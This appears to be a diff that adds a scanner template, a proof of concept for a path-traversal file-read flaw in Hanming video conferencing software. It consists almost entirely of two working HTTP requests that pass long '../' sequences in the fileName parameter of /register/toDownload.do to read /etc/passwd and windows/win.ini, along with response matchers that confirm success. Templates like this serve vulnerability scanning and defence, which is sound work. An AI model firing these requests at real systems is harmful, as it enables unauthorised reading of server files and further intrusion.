@@ -1,0 +1,40 @@
+id: poc-yaml-hanming-video-conferencing-file-read
+
+info:
+  name: poc-yaml-hanming-video-conferencing-file-read
+  author: kzaopa(https://github.com/kzaopa)
+  severity: medium
+  tags: xray-converted,lfi,ct-158007
+  reference:
+    - https://mp.weixin.qq.com/s/F-M21PT0xn9QOuwoC8llKA
+
+http:
+  - raw:
+      - |
+        GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
+  - raw:
+      - |
+        GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+          - "[extensions]"
